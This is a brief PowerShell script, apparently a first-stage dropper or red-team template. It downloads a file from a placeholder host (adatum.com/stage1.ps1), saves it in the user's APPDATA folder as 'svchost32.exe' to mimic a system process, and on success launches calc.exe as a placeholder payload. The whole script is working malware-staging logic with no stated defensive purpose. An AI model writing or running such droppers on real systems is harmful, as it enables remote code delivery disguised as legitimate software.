
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl = "https://adatum.com:443/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 167
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-StageDownload -SourceUrl $TargetUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
